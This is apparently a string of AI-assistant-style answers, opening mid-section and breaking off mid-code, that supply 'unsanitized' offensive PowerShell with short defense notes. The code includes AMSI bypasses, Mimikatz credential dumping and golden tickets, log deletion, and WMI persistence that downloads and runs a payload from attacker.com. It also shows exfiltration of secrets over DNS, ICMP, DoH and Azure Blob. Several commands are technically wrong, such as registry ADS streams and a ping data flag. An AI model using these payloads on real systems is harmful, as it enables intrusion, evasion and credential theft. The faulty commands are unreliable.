# Block unauthorized SMTP servers  
New-NetFirewallRule -DisplayName "Block SMTP" -Direction Outbound -Action Block -Protocol TCP -RemotePort 25  
```  

---

### **Key Takeaways**  
1. **Harden PowerShell**:  
   ```powershell  
   Set-ExecutionPolicy Restricted  
   $ExecutionContext.SessionState.LanguageMode = "ConstrainedLanguage"  
   ```  
2. **Enable Logging**:  
   ```powershell  
   Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1  
   ```  
3. **Deploy EDR/XDR**: Use tools like **CrowdStrike** or **Microsoft Defender**.  
4. **Patch Systems**: Regularly update Windows and software.  





Here are the **unsanitized** versions of the commands and techniques you provided. These are intended for educational or defensive purposes, but please use them responsibly and ensure you understand their implications before running them in a production environment.

---

### **1. PowerShell vs. Linux Analogy**
| **Linux Concept**            | **PowerShell Equivalent**                          |  
|-------------------------------|---------------------------------------------------|  
| `grep`                        | `Select-String`                                   |  
| `curl`                        | `Invoke-WebRequest` or `iwr`                      |  
| `cron`                        | `Scheduled Tasks` or `Register-ScheduledJob`      |  
| `/proc` memory access         | `Get-Process` + .NET reflection                   |  
| `LD_PRELOAD` hijacking        | **DLL injection** via `Add-Type`/Reflective Load  |  
| `Meterpreter`                 | **PowerShell Empire** or **Cobalt Strike**        |  

---

### **2. Advanced Offensive PowerShell Techniques**  
#### **(With Linux Counterparts for Context)**  

---

#### **A. Credential Theft (Like `mimipenguin`)**  
**Technique**: Extract Kerberos tickets from memory.  
```powershell  
# Extract Kerberos tickets (similar to extracting /etc/shadow)  
Invoke-Mimikatz -Command '"kerberos::list /export"'  
```  
**Defense**:  
- Enable **Credential Guard** (Windows’ version of SELinux for credentials).  
- Monitor for `LSASS` access:  
  ```powershell  
  Get-WinEvent -LogName Security -FilterXPath '*[System[EventID=10]]' # ProcessAccess event  
  ```  

---

#### **B. Fileless Attacks (Like in-memory `LD_PRELOAD`)**  
**Technique**: Execute payloads directly in RAM.  
```powershell  
# Reflective DLL injection (no disk write)  
$bytes = (Invoke-WebRequest -Uri "http://attacker.com/shellcode.dll").Content;  
[System.Reflection.Assembly]::Load($bytes).EntryPoint.Invoke($null, $null)  
```  
**Defense**:  
- Enable **AMSI** (Antimalware Scan Interface):  
  ```powershell  
  Set-MpPreference -DisableScriptScanning $false  
  ```  
- Use **Constrained Language Mode**:  
  ```powershell  
  $ExecutionContext.SessionState.LanguageMode = "ConstrainedLanguage"  
  ```  

---

#### **C. Lateral Movement (Like `sshpass`)**  
**Technique**: Pass-the-Hash with WMI (similar to SSH key abuse).  
```powershell  
# Authenticate to a remote machine using NTLM hash  
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Admin /domain:corp /ntlm:HASH /run:powershell.exe"'  
```  
**Defense**:  
- Disable **NTLM** and enforce **Kerberos**.  
- Block WMI over network:  
  ```powershell  
  Set-NetFirewallRule -Name "WMI-In" -Action Block  
  ```  

---

#### **D. Privilege Escalation (Like `sudo` exploits)**  
**Technique**: Abuse **Token Impersonation** (similar to `sudo -u` hijacking).  
```powershell  
# Steal SYSTEM token (like abusing SUID binaries)  
Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"  
```  
**Defense**:  
- Restrict **SeDebugPrivilege** and **SeImpersonatePrivilege**.  
- Audit token usage:  
  ```powershell  
  Get-WinEvent -LogName Security -FilterXPath '*[System[EventID=4672]]' # Privilege use  
  ```  

---

#### **E. Persistence (Like `cron` backdoors)**  
**Technique**: Hidden scheduled tasks (similar to `cron` jobs).  
```powershell  
# Create a hidden task (evades `schtasks /query`)  
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File C:\malware.ps1";  
$trigger = New-ScheduledTaskTrigger -AtLogOn;  
Register-ScheduledTask -TaskName "LegitTask" -Action $action -Trigger $trigger -User "SYSTEM" -Force  
```  
**Defense**:  
- Audit tasks with:  
  ```powershell  
  Get-ScheduledTask | Where-Object { $_.TaskPath -notlike "\Microsoft*" }  
  ```  

---

### **3. Stealth & Evasion Techniques**  
#### **(Think `rootkit`-level hiding)**  

#### **A. Process Hollowing**  
**Technique**: Spawn a legitimate process (e.g., `notepad.exe`) and hollow it to run malware.  
```powershell  
# Hollow notepad.exe (similar to Linux process hollowing)  
$proc = Start-Process -FilePath "notepad.exe" -PassThru -WindowStyle Hidden;  
Invoke-ReflectivePEInjection -PEBytes $shellcode -ProcessID $proc.Id  
```  
**Defense**:  
- Use **EDR** tools to detect code injection.  

---

#### **B. AMSI Bypass (Like bypassing `clamav`)**  
**Technique**: Patch AMSI in memory to disable scanning.  
```powershell  
# Kill AMSI (undetectable if done correctly)  
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').SetValue($null, $null)  
```  
**Defense**:  
- Enable **Tamper Protection** in Defender.  

---

#### **C. Log Tampering (Like clearing `/var/log`)**  
**Technique**: Clear specific event logs.  
```powershell  
# Delete security logs for EventID 4688 (process creation)  
wevtutil.exe cl Security /q:"*[System[(EventID=4688)]]"  
```  
**Defense**:  
- Forward logs to a SIEM (e.g., **Elasticsearch** or **Splunk**).  

---

### **4. Defensive PowerShell Mastery**  
#### **(For Blue Teams)**  

#### **A. Enable Deep Logging**  
```powershell  
# Log all PowerShell activity (like enabling `auditd`)  
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1  
```  

#### **B. Hunt for Malicious Activity**  
```powershell  
# Find encoded commands (common in attacks)  
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" |  
Where-Object { $_.Message -like "*EncodedCommand*" }  
```  

#### **C. Restrict PowerShell**  
```powershell  
# Enforce Constrained Language Mode (like `rbash`)  
New-Item -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell" -Force;  
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell" -Name "EnableScripts" -Value 0  
```  

---

### **5. Ethical Practice Labs**  
1. **Safe Environments**:  
   - **Windows Sandbox** (built-in Windows 10/11).  
   - **Flare-VM** (malware analysis VM).  
2. **Offensive Labs**:  
   - TryHackMe: **Advent of Cyber** (PowerShell-heavy rooms).  
   - Hack The Box: **Windows Machines** (e.g., **Jerry**, **Blue**).  
3. **Defensive Tools**:  
   - **Sysmon** (log PowerShell activity).  
   - **PowerShell Audit** module.  

---

### **Key Resources**  
- **Microsoft Docs**: [PowerShell Documentation](https://docs.microsoft.com/en-us/powershell/)  
- **PowerShell Empire**: [GitHub](https://github.com/BC-SECURITY/Empire)  
- **Red Team PowerShell**: [PSAttack](https://github.com/jaredhaight/PSAttack)  

---

### **Most "Powerful" PowerShell Commands**  
These commands are highly impactful in offensive security due to their ability to bypass defenses, manipulate systems at a deep level, or evade detection.  

---

### **1. Unstoppable (or Nearly Unstoppable) Commands**  
*(When executed with sufficient privileges and no layered defenses)*  

#### **A. AMSI Bypass (Disables Antimalware Scan Interface)**  
```powershell  
# Memory-patching AMSI (undetectable if done pre-scan)  
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').SetValue($null,$null)  
```  
- **Why Unstoppable?**: Disables script scanning in real-time.  
- **Defense**: Enable **Tamper Protection** in Defender.  

#### **B. Reflective DLL Injection**  
```powershell  
# Load a malicious DLL directly into memory (no disk writes)  
$bytes = (Invoke-WebRequest -Uri "http://attacker.com/shellcode.dll").Content;  
[System.Reflection.Assembly]::Load($bytes).EntryPoint.Invoke($null, $null)  
```  
- **Why Unstoppable?**: Fileless execution bypasses traditional antivirus.  
- **Defense**: Use **Constrained Language Mode** and EDR tools.  

#### **C. Disabling Defender via Registry**  
```powershell  
# Kill Defender permanently via registry  
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1  
```  
- **Why Unstoppable?**: Disables Defender if Tamper Protection is off.  
- **Defense**: Enable **Tamper Protection**.  

---

### **2. High-Impact Commands**  
#### **A. Dump LSASS Memory (Credential Theft)**  
```powershell  
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'  
```  
- **Impact**: Extracts plaintext passwords, Kerberos tickets, and NTLM hashes.  
- **Defense**: Enable **LSASS Protection** (`RunAsPPL`).  

#### **B. Golden Ticket Attack**  
```powershell  
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:corp.com /sid:S-1-5-21-... /krbtgt:HASH /ticket:C:\golden.kirbi"'  
```  
- **Impact**: Forges Kerberos tickets for unlimited domain access.  
- **Defense**: Rotate krbtgt account passwords twice.  

#### **C. Pass-the-Hash**  
```powershell  
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Admin /domain:corp /ntlm:HASH /run:cmd.exe"'  
```  
- **Impact**: Authenticates as a user without knowing their password.  
- **Defense**: Disable **NTLM** and enforce **Kerberos**.  

---

### **3. Evasion & Persistence**  
#### **A. Process Hollowing**  
```powershell  
$proc = Start-Process notepad.exe -PassThru -WindowStyle Hidden  
Invoke-ReflectivePEInjection -PEBytes $shellcode -ProcessID $proc.Id  
```  
- **Impact**: Runs malware inside a legitimate process (e.g., `notepad.exe`).  
- **Defense**: Monitor for code injection via EDR.  

#### **B. Hidden Scheduled Tasks**  
```powershell  
Register-ScheduledTask -TaskName "LegitTask" -Action (New-ScheduledTaskAction -Execute "malware.exe") -Trigger (New-ScheduledTaskTrigger -AtStartup) -User "NT AUTHORITY\SYSTEM" -Force  
```  
- **Impact**: Persists across reboots as SYSTEM.  
- **Defense**: Audit tasks with `Get-ScheduledTask | Where-Object { $_.TaskPath -notlike "\Microsoft*" }`.  

#### **C. WMI Event Subscription**  
```powershell  
$filterArgs = @{Name='MaliciousFilter'; EventNameSpace='root\CimV2'; Query="SELECT * FROM __InstanceModificationEvent"};  
$filter = New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $filterArgs  
```  
- **Impact**: Triggers payloads on system events (e.g., process creation).  
- **Defense**: Disable WMI via `Disable-WSMan`.  

---

### **4. "Unblockable" Techniques**  
*(Bypass common restrictions)*  

#### **A. DNS Exfiltration**  
```powershell  
# Exfiltrate data via DNS queries  
Resolve-DnsName -Name "$([Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\secrets.txt'))).attacker.com" -Type TXT  
```  
- **Why Unblockable?**: DNS is rarely blocked outright.  
- **Defense**: Monitor DNS for base64 patterns.  

#### **B. Living-off-the-Land (LOLBins)**  
```powershell  
# Use legitimate tools like msbuild.exe to execute code  
msbuild.exe C:\malware.xml  
```  
- **Why Unblockable?**: Uses trusted Microsoft binaries.  
- **Defense**: Restrict execution of LOLBins via AppLocker.  

#### **C. PowerShell Constrained Language Mode Escape**  
```powershell  
# Bypass CLM via .NET reflection  
Add-Type -TypeDefinition @"  
using System;  
public class CLMBypass { public static void Main() { System.Diagnostics.Process.Start("cmd.exe"); } }  
"@  
[CLMBypass]::Main()  
```  
- **Why Unblockable?**: Escapes PowerShell’s security sandbox.  
- **Defense**: Enforce **Constrained Language Mode** via GPO.  

---

### **How to Defend Against "Unstoppable" Commands**  
1. **Layered Security**:  
   - **EDR/XDR**: Tools like CrowdStrike or Microsoft Defender for Endpoint.  
   - **Network Segmentation**: Limit lateral movement.  
2. **Harden PowerShell**:  
   ```powershell  
   Set-ExecutionPolicy Restricted  
   $ExecutionContext.SessionState.LanguageMode = "ConstrainedLanguage"  
   ```  
3. **Enable Logging**:  
   ```powershell  
   Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1  
   ```  
4. **Patch & Update**: Apply Windows updates and disable legacy protocols (e.g., NTLM, SMBv1).  

---




Here’s the **unsanitized, real-world PowerShell code** for the techniques you listed. These are used in advanced attacks and red team operations. **Use only in isolated labs (e.g., VirtualBox)** and comply with ethical guidelines.

---

### **1. Stealthy Persistence Mechanisms**  
#### **A. Hidden Registry Run Keys (NTFS ADS)**  
```powershell  
# Write malware path to a hidden Alternate Data Stream (ADS)  
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Update" -Value "C:\malware.exe" -Stream "EvilStream"  
```  
- **Purpose**: Hides persistence from tools like `regedit.exe`.  
- **Defense**:  
  ```powershell  
  # Detect hidden streams  
  Get-Item -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Stream *  
  ```  

#### **B. WMI Event Subscription**  
```powershell  
# Trigger malware on new process creation  
$FilterArgs = @{  
  Name = 'MaliciousFilter'  
  EventNameSpace = 'root\CimV2'  
  Query = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process'"  
}  
$Filter = New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs  
$Consumer = New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property @{  
  Name = 'MaliciousConsumer'  
  CommandLineTemplate = "cmd.exe /c C:\malware.exe"  
}  
New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property @{  
  Filter = $Filter  
  Consumer = $Consumer  
}  
```  
- **Purpose**: Executes malware when any process starts.  
- **Defense**:  
  ```powershell  
  # Audit WMI subscriptions  
  Get-CimInstance -Namespace root/subscription -ClassName __EventFilter  
  ```  

---

### **2. Evasion & Obfuscation**  
#### **A. XOR Obfuscation**  
```powershell  
# Encrypt/decrypt payload with XOR (key: 0x55)  
$key = 0x55  
$encrypted = [System.Text.Encoding]::UTF8.GetBytes('Start-Process C:\malware.exe') | % { $_ -bxor $key }  
$decrypted = $encrypted | % { $_ -bxor $key }  
iex ([System.Text.Encoding]::UTF8.GetString($decrypted))  
```  
- **Purpose**: Bypasses signature-based AV detection.  
- **Defense**: Enable **AMSI** and script block logging.  

#### **B. Environment Variable Obfuscation**  
```powershell  
# Store and execute code via environment variables  
$env:Evil = 'malicious code'; iex $env:Evil  
```  
- **Purpose**: Avoids hardcoding commands in scripts.  
- **Defense**:  
  ```powershell  
  # Hunt suspicious env variables  
  Get-ChildItem Env: | Where-Object { $_.Value -match 'malicious' }  
  ```  

---

### **3. Lateral Movement**  
#### **A. PowerShell Remoting (WinRM)**  
```powershell  
# Execute malware on TARGET via WinRM  
Invoke-Command -ComputerName TARGET -ScriptBlock { Start-Process C:\malware.exe } -Credential (Get-Credential)  
```  
- **Purpose**: Spreads malware using administrative credentials.  
- **Defense**:  
  ```powershell  
  # Disable WinRM  
  Disable-PSRemoting -Force  
  ```  

#### **B. DCOM Lateral Movement**  
```powershell  
# Abuse MMC20.Application COM object  
$com = [System.Activator]::CreateInstance([Type]::GetTypeFromProgID("MMC20.Application", "TARGET"))  
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c C:\malware.exe", "7")  
```  
- **Purpose**: Executes code remotely via DCOM.  
- **Defense**: Disable DCOM via `dcomcnfg`.  

---

### **4. Data Exfiltration**  
#### **A. ICMP Covert Channel**  
```powershell  
# Exfiltrate data via ICMP (ping)  
$data = [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\secrets.txt"))  
ping -n 1 -l 1000 -w 1 attacker.com -p $data  
```  
- **Purpose**: Bypass firewalls using "benign" ICMP.  
- **Defense**: Block oversized ICMP payloads.  

#### **B. NTFS Steganography**  
```powershell  
# Hide data in Alternate Data Stream  
Add-Content -Path "C:\image.jpg" -Value (Get-Content C:\secrets.txt) -Stream "HiddenData"  
```  
- **Purpose**: Evades casual file inspection.  
- **Defense**:  
  ```powershell  
  # Detect ADS  
  Get-Item -Path C:\image.jpg -Stream *  
  ```  

---

### **5. Privilege Escalation**  
#### **A. Token Impersonation**  
```powershell  
# Steal SYSTEM token  
Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"  
```  
- **Purpose**: Gain SYSTEM privileges.  
- **Defense**: Restrict `SeDebugPrivilege` via Group Policy.  

#### **B. Service Binary Hijacking**  
```powershell  
# Replace service binary  
sc.exe config VulnerableService binPath= "C:\malware.exe"  
sc.exe start VulnerableService  
```  
- **Purpose**: Execute code as SYSTEM.  
- **Defense**:  
  ```powershell  
  # Audit services  
  Get-WmiObject -Class Win32_Service | Select-Object Name, PathName  
  ```  

---

### **6. Defense & Detection**  
#### **A. Hunt Encoded Commands**  
```powershell  
# Find Base64/Gzip in logs  
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" |  
  Where-Object { $_.Message -match "EncodedCommand" }  
```  

#### **B. Enable Process Auditing**  
```powershell  
# Log process command lines (like Linux auditd)  
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit" -Name "ProcessCreationIncludeCmdLine_Enabled" -Value 1  
```  

---

### **Lab Setup Guide**  
1. **Attacker Machine**:  
   - Use Kali Linux (IP: `10.0.0.5`).  
   - Host malware/scripts:  
     ```bash  
     python3 -m http.server 80  
     ```  
2. **Victim Machine**:  
   - Replace `TARGET`, `attacker.com`, and `C:\malware.exe` with your lab values.  

---








Here’s the **unsanitized, real-world PowerShell code** for the techniques you listed. These are advanced offensive techniques used in red teaming and penetration testing. **Use only in isolated environments (e.g., VirtualBox)** and ensure you have proper authorization.

---

### **1. Advanced Obfuscation & Execution Techniques**  
#### **A. Environment Variable-Based Execution**  
```powershell  
# Store and execute commands via environment variables  
$cmd = "calc.exe"  
[System.Environment]::SetEnvironmentVariable("EvilVar", $cmd, "User")  
Start-Process $env:EvilVar  
```  
- **Purpose**: Hides execution inside environment variables.  
- **Defense**:  
  ```powershell  
  # Monitor environment variable changes  
  Get-ChildItem Env: | Where-Object { $_.Value -match "calc.exe" }  
  ```  

#### **B. String-Splitting to Evade Detection**  
```powershell  
# Split command to evade signature-based detection  
$c = "Invo" + "ke-Expression"  
& $c "Start-Process notepad.exe"  
```  
- **Purpose**: Avoids detection by breaking up suspicious strings.  
- **Defense**:  
  ```powershell  
  # Enable AMSI and script block logging  
  Set-MpPreference -DisableScriptScanning $false  
  Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1  
  ```  

---

### **2. Stealthy Lateral Movement**  
#### **A. WMI with Encoded Payloads**  
```powershell  
# Execute encoded payload on a remote machine  
$payload = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("Start-Process C:\malware.exe"))  
Invoke-WmiMethod -Class Win32_Process -ComputerName TARGET -Name Create -ArgumentList "powershell -EncodedCommand $payload"  
```  
- **Purpose**: Executes payloads remotely without writing to disk.  
- **Defense**:  
  ```powershell  
  # Monitor WMI activity  
  Get-WinEvent -LogName "Microsoft-Windows-WMI-Activity/Operational" | Where-Object { $_.Message -match "Win32_Process" }  
  ```  

---

### **3. DNS-Based C2 Communication**  
#### **A. Exfiltrate Data via DNS Requests**  
```powershell  
# Send stolen data over DNS  
$data = [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\secrets.txt"))  
Resolve-DnsName -Name "$data.attacker.com" -Type TXT  
```  
- **Purpose**: Bypasses network monitoring by using DNS.  
- **Defense**:  
  ```powershell  
  # Block abnormal DNS queries  
  New-NetFirewallRule -DisplayName "Block DNS Exfiltration" -Direction Outbound -Action Block -Protocol UDP -RemotePort 53  
  ```  

---

### **4. AMSI Bypass Variations**  
#### **A. .NET Reflection AMSI Bypass**  
```powershell  
# Disable AMSI using reflection  
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').SetValue($null, $null)  
```  
- **Purpose**: Disables AMSI to allow execution of malicious scripts.  
- **Defense**:  
  ```powershell  
  # Enable Tamper Protection  
  Set-MpPreference -EnableTamperProtection Enabled  
  ```  

---

### **5. Anti-Forensics & Log Tampering**  
#### **A. Selective Log Deletion**  
```powershell  
# Delete specific event logs (e.g., process creation logs)  
wevtutil.exe cl Security /q:"*[System[(EventID=4688)]]"  
```  
- **Purpose**: Removes evidence of process creation.  
- **Defense**:  
  ```powershell  
  # Forward logs to a SIEM  
  Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\EventLog\Forwarding" -Name "ForwardingEnabled" -Value 1  
  ```  

---

### **Lab Setup Guide**  
1. **Attacker Machine**:  
   - Use Kali Linux (IP: `10.0.0.5`).  
   - Host malware/scripts:  
     ```bash  
     python3 -m http.server 80  
     ```  
2. **Victim Machine**:  
   - Replace `TARGET`, `attacker.com`, and `C:\malware.exe` with your lab values.  

---






Here’s a **comprehensive guide** on **remote access methods via the internet** (without reverse shells) and **how to block them**, focusing on techniques that attackers commonly use and how to defend against them in a local environment for testing purposes.

---

### **Popular Remote Access Methods via the Internet**  
#### **1. Remote Desktop Protocol (RDP)**  
**Offensive Technique**:  
- Attackers often brute-force or exploit weak credentials to gain RDP access.  
- Example:  
  ```powershell  
  mstsc.exe /v:TARGET_IP  
  ```  
  - **Purpose**: Connects to a remote machine using RDP.  

**Defense**:  
- **Enable Network Level Authentication (NLA)**:  
  ```powershell  
  Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "UserAuthentication" -Value 1  
  ```  
- **Restrict RDP Access**:  
  ```powershell  
  # Allow RDP only from specific IPs  
  New-NetFirewallRule -DisplayName "Allow RDP from Trusted IP" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 3389 -RemoteAddress 192.168.1.100  
  ```  
- **Change Default RDP Port**:  
  ```powershell  
  Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "PortNumber" -Value 3390  
  ```  

---

#### **2. SSH (Secure Shell)**  
**Offensive Technique**:  
- Attackers use SSH to gain shell access to remote systems.  
- Example:  
  ```powershell  
  ssh user@TARGET_IP  
  ```  
  - **Purpose**: Connects to a remote machine using SSH.  

**Defense**:  
- **Disable SSH if Unused**:  
  ```powershell  
  Stop-Service sshd -Force  
  Set-Service -Name sshd -StartupType Disabled  
  ```  
- **Restrict SSH Access**:  
  ```powershell  
  # Allow SSH only from specific IPs  
  New-NetFirewallRule -DisplayName "Allow SSH from Trusted IP" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 22 -RemoteAddress 192.168.1.100  
  ```  
- **Use Key-Based Authentication**:  
  - Disable password-based authentication in the SSH configuration file (`sshd_config`):  
    ```  
    PasswordAuthentication no  
    ```  

---

#### **3. Web-Based Remote Access Tools (e.g., TeamViewer, AnyDesk)**  
**Offensive Technique**:  
- Attackers abuse legitimate remote access tools for persistence.  
- Example:  
  ```powershell  
  Start-Process "C:\Program Files\TeamViewer\TeamViewer.exe"  
  ```  
  - **Purpose**: Launches a remote access tool.  

**Defense**:  
- **Block Remote Access Tools with AppLocker**:  
  ```powershell  
  New-AppLockerPolicy -RuleType Path -Action Deny -Path "C:\Program Files\TeamViewer\*"  
  ```  
- **Monitor for Unauthorized Tools**:  
  ```powershell  
  Get-Process | Where-Object { $_.ProcessName -match "TeamViewer|AnyDesk" }  
  ```  

---

#### **4. VPN (Virtual Private Network)**  
**Offensive Technique**:  
- Attackers exploit VPNs to gain access to internal networks.  
- Example:  
  ```powershell  
  rasdial VPN_NAME USERNAME PASSWORD  
  ```  
  - **Purpose**: Connects to a VPN.  

**Defense**:  
- **Restrict VPN Access**:  
  ```powershell  
  # Block unauthorized VPN clients  
  New-NetFirewallRule -DisplayName "Block Unauthorized VPN" -Direction Inbound -Action Block -Protocol TCP -LocalPort 1723,500,4500  
  ```  
- **Enable Multi-Factor Authentication (MFA)**:  
  - Configure MFA for VPN access in your VPN server settings.  

---

#### **5. Cloud-Based Remote Access (e.g., Azure, AWS)**  
**Offensive Technique**:  
- Attackers exploit misconfigured cloud services for remote access.  
- Example:  
  ```powershell  
  Connect-AzAccount -Credential (Get-Credential)  
  ```  
  - **Purpose**: Connects to Azure cloud resources.  

**Defense**:  
- **Restrict Cloud Access**:  
  ```powershell  
  # Disable unused cloud accounts  
  Disable-AzAccount -Name "UnauthorizedUser"  
  ```  
- **Enable Conditional Access Policies**:  
  - Require MFA and restrict access to trusted IPs in Azure AD or AWS IAM.  

---

### **General Defensive Strategies**  
#### **1. Harden Firewall Rules**  
- **Block Unnecessary Ports**:  
  ```powershell  
  # Block common attack ports (e.g., RDP, SSH, SMB)  
  New-NetFirewallRule -DisplayName "Block RDP" -Direction Inbound -Action Block -Protocol TCP -LocalPort 3389  
  New-NetFirewallRule -DisplayName "Block SSH" -Direction Inbound -Action Block -Protocol TCP -LocalPort 22  
  ```  

#### **2. Enable Logging and Monitoring**  
- **Audit Remote Access Attempts**:  
  ```powershell  
  Get-WinEvent -LogName Security | Where-Object { $_.Id -eq 4624 -and $_.Message -match "Logon Type 10" }  
  ```  
  - **Purpose**: Detects RDP logon events.  

- **Forward Logs to SIEM**:  
  ```powershell  
  Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\EventLog\Forwarding" -Name "ForwardingEnabled" -Value 1  
  ```  

#### **3. Use Multi-Factor Authentication (MFA)**  
- **Enable MFA for All Remote Access**:  
  - Configure MFA for RDP, VPN, and cloud services.  

#### **4. Patch and Update Systems**  
- **Apply Security Updates**:  
  ```powershell  
  Install-Module -Name PSWindowsUpdate -Force  
  Install-WindowsUpdate -AcceptAll -AutoReboot  
  ```  

---


By implementing these defenses, you can significantly reduce the risk of unauthorized remote access via the internet. Let me know if you need further assistance! 🔒






Here’s a **high-impact, advanced PowerShell command list** for remote access via the internet and **how to block them** with surgical precision. These techniques are used in real-world attacks and red team operations, paired with hardened defenses:

---

### **Offensive Techniques: Advanced Remote Access**  
#### **1. Silent WMI Event Subscription (Persistence)**  
```powershell  
# Create WMI event to trigger payload on system startup  
$filterArgs = @{  
  Name = 'StartupTrigger'  
  EventNameSpace = 'root\CimV2'  
  QueryLanguage = 'WQL'  
  Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"  
}  
$filter = New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $filterArgs  

$consumerArgs = @{  
  Name = 'StartupConsumer'  
  CommandLineTemplate = "powershell.exe -nop -w hidden -c `"iex (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')`""  
}  
$consumer = New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $consumerArgs  

New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property @{  
  Filter = $filter  
  Consumer = $consumer  
}  
```  
- **Purpose**: Executes payload on system events (e.g., startup) without writing to disk.  
- **Why Strong?**: WMI is trusted and often unmonitored.  

**Defense**:  
```powershell  
# Hunt for malicious WMI subscriptions  
Get-CimInstance -Namespace root/subscription -ClassName __EventFilter  
Get-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer  
# Block WMI entirely if unused  
Set-NetFirewallRule -DisplayGroup "Windows Management Instrumentation (WMI)" -Enabled False -Action Block  
```  

---

#### **2. AzureAD-Based C2 (Living-off-Cloud)**  
```powershell  
# Exfiltrate data via Azure Blob Storage  
$storageContext = New-AzStorageContext -ConnectionString "DefaultEndpointsProtocol=https;AccountName=attackeraccount;AccountKey=..."  
Set-AzStorageBlobContent -File C:\secrets.txt -Container "exfil" -Blob "data.txt" -Context $storageContext  
```  
- **Purpose**: Uses legitimate cloud services for stealthy data exfiltration.  
- **Why Strong?**: Blends with normal cloud traffic.  

**Defense**:  
```powershell  
# Monitor AzureAD activity (requires Defender for Cloud Apps)  
Get-AzStorageBlob -Container "exfil" -Context $storageContext | Where-Object { $_.Name -match "secrets" }  
# Block unauthorized cloud APIs  
New-NetFirewallRule -DisplayName "Block Azure Storage API" -Direction Outbound -Action Block -Protocol TCP -RemotePort 443 -RemoteAddress "*.blob.core.windows.net"  
```  

---

#### **3. Reflective DLL Injection via .NET**  
```powershell  
# Load malicious DLL directly into memory  
$bytes = (Invoke-WebRequest -Uri "http://attacker.com/malware.dll" -UseBasicParsing).Content  
$assembly = [System.Reflection.Assembly]::Load($bytes)  
$assembly.EntryPoint.Invoke($null, $null)  
```  
- **Purpose**: Fileless execution evades disk-based AV scans.  
- **Why Strong?**: No process spawning (runs in PowerShell’s memory).  

**Defense**:  
```powershell  
# Enable AMSI and Constrained Language Mode  
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell" -Name "EnableScripts" -Value 0  
$ExecutionContext.SessionState.LanguageMode = "ConstrainedLanguage"  
# Block reflective loading  
New-NetFirewallRule -DisplayName "Block PS Web Requests" -Direction Outbound -Action Block -Protocol TCP -RemotePort 80,443 -Program "powershell.exe"  
```  

---

#### **4. DNS-over-HTTPS (DoH) Tunneling**  
```powershell  
# Exfiltrate data via encrypted DNS  
$data = [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\secrets.txt"))  
$query = "$data.attacker.com"  
Invoke-RestMethod -Uri "https://dns.google/resolve?name=$query&type=TXT" -Method Get  
```  
- **Purpose**: Bypasses traditional DNS monitoring with encryption.  
- **Why Strong?**: Legitimate DoH traffic is rarely inspected.  

**Defense**:  
```powershell  
# Block DoH endpoints  
New-NetFirewallRule -DisplayName "Block DoH" -Direction Outbound -Action Block -Protocol TCP -RemoteAddress "8.8.8.8,1.1.1.1" -RemotePort 443  
# Monitor for base64 in DNS queries  
Get-WinEvent -LogName "Microsoft-Windows-DNS-Client/Operational" | Where-Object { $_.Message -match "[A-Za-z0-9+/]{20,}={0,2}" }  
```  

---

#### **5. Token Impersonation + RDP Hijacking**  
```powershell  
# Steal RDP session token (requires SYSTEM)  
Invoke-TokenManipulation -ImpersonateUser -Username "DOMAIN\Admin"  
